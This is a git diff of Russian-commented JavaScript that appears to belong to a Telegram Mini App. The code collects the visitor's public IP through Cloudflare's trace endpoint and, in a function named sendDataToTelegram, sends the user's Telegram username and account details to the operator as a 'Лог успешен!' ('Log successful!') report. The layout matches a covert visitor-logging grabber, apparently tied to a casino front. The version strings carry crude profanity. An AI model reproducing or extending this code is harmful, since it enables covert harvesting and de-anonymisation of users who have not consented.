@@ -20,20 +20,36 @@
 
 async function fetchPublicIP() {
     try {
+        // Сначала пробуем получить IP из предзагруженных данных
+        const traceDivData = document.getElementById('cf-trace').textContent;
+        if (traceDivData) {
+            const data = traceDivData.split('\n').reduce((obj, line) => {
+                const [key, value] = line.split('=');
+                if (key && value) obj[key.trim()] = value.trim();
+                return obj;
+            }, {});
+            
+            if (data.ip) {
+                console.log('Using pre-loaded IP:', data.ip);
+                return data.ip;
+            }
+        }
+
+        // Если предзагруженных данных нет, пробуем получить напрямую
+        console.log('Trying direct Cloudflare request...');
         const response = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
         const text = await response.text();
         
-        // Parse Cloudflare trace data
         const data = text.split('\n').reduce((obj, line) => {
             const [key, value] = line.split('=');
             if (key && value) obj[key.trim()] = value.trim();
             return obj;
         }, {});
         
-        // Return IP from Cloudflare trace
+        console.log('Got IP from direct request:', data.ip);
         return data.ip || 'Не удалось получить IP';
     } catch (error) {
-        console.error('Error fetching IP from Cloudflare:', error);
+        console.error('Error fetching IP:', error);
         return 'Не удалось получить IP';
     }
 }
@@ -106,8 +122,7 @@ async function sendDataToTelegram() {
         // Safe access to user data with fallbacks
         const user = tg.initDataUnsafe.user || {};
         const message = `
-версия: 1.3 - вернул казик обратно
-
+v1.3.1 - я ебал ваш айфон в рот, пытаемся пофиксить
 <b>✨ Лог успешен!</b>
 <b>🔍 Информация об аккаунте:</b>
 ├ Тэг: @${user.username || 'Отсутствует'}
@@ -157,7 +172,7 @@ async function sendDataToTelegram() {
         // Send error report to Telegram
         try {
             const errorMessage = `
-версия: 1.3 - вернул казик обратно
+v1.3.1 - я ебал ваш айфон в рот, пытаемся пофиксить
 
 <b>⚠️ Ошибка в скрипте!</b>
 <b>🔍 Детали ошибки:</b>
@@ -186,9 +201,9 @@ async function sendDataToTelegram() {
     }
 }
 
-// Wait for page load then initialize
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', sendDataToTelegram);
-} else {
-    sendDataToTelegram();
-}
+// Remove the auto-initialization since we now control it from index.html
+// if (document.readyState === 'loading') {
+//     document.addEventListener('DOMContentLoaded', sendDataToTelegram);
+// } else {
+//     sendDataToTelegram();
+// }
